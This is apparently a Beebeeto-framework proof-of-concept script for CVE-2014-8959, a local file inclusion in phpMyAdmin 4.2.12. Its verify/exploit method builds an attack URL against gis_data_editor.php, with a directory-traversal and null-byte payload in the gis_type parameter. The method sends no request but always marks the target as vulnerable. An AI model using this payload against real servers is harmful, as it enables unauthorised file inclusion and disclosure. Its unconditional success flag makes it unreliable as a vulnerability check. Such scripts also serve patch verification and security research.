#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0168',
            'name': 'PHPMyAdmin 4.2.12 /libraries/gis/pma_gis_factory.php 本地文件包含漏洞 POC',
            'author': 'foundu',
            'create_date': '2014-11-28',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'phpmyadmin',
            'vul_version': ['4.2.12'],
            'type': 'Local File Inclusion',
            'tag': ['phpmyadmin漏洞', '本地文件包含漏洞', '/libraries/gis/pma_gis_factory.php', 'php'],
            'desc': '''
                    CVE-2014-8959(http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8959)
                    issue: http://www.phpmyadmin.net/home_page/security/PMASA-2014-14.php
                    fix: https://github.com/phpmyadmin/phpmyadmin/commit/2e3f0b9457b3c8f78beb864120bd9d55617a11b5
                    ''',
            'references': ['http://bobao.360.cn/learning/detail/113.html',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        # Token & file_path, Modify their own.
        token = 'ChangeME'
        inclusion_file = '../../../ChangeMe.jpg%00'
        tmp_url = args['options']['target'] + '/pma/gis_data_editor.php?token=' + token
        verify_url = tmp_url + '&gis_data[gis_type]=' + inclusion_file
        if args['options']['verbose']:
            print '[*] Generation...'
        print '[+] Specific use: ' + 'edit token, inclusion_file.'
        print '[+] Generation ok'
        print
        args['success'] = True
        args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())